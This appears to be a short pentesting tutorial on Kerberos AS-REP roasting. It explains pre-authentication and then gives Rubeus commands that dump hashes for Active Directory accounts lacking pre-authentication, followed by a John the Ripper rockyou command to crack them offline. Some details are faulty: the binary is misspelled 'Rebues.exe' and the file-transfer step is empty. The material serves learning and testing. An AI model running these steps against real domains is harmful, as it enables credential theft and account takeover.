#### AS-REP (Authentication Service Reply)
**AS-REP** is the ***Authentication Service response message***, which is used to request a ***Ticket Granting Ticket (TGT)*** in Kerberos. When a client sends an ***AS-REQ*** to the KDC's Authentication Service, it typically includes a ***timestamp encrypted with the user's password hash***. The AS validates this by decrypting the timestamp. If successful, it issues an ***AS-REP*** containing two parts: one encrypted with the user's password, and the other being the ***TGT*** for future authentication. This process is known as Kerberos `pre-authentication.`

#### What is an AS-REP roasting attack?
Kerberos authentication uses the `pre-authentication` feature as its ***first measure to prevent offline brute-forcing attacks*** against domain user credentials. **AS-REP roasting** attacks are possible when an account doesn't need `pre-authentication`, having had the feature `disabled` in AD, often for backward compatibilities with legacy Kerberos libraries.

When `pre-authentication` is disabled, a malicious user can directly request authentication info from the DC. This would return a message with an encrypted part of the ticket which can be brute forced offline, also known as AS-REP roasting.

#### AS-REP Roasting with Rubeus
This toolset has an inbuilt function that ***queries the DC for all domain accounts that have `pre-authentication` disabled***, and further ***dumps its hashes***.

**Execute Rubeus**
```powershell
.\Rebues.exe asreproast
```

**Execute Rubeus to Save the Hash in a specific format**
```powershell
.\Rebues.exe asreproast /format:john /outfile:hashes.txt
```

#### Transfer the Hash file to your Kali 
```bash 

```
#### Bruteforce Credentials
```bash
john --wordlist=/var/usr/share/wordlists/rockyou.txt <hashes.txt>
```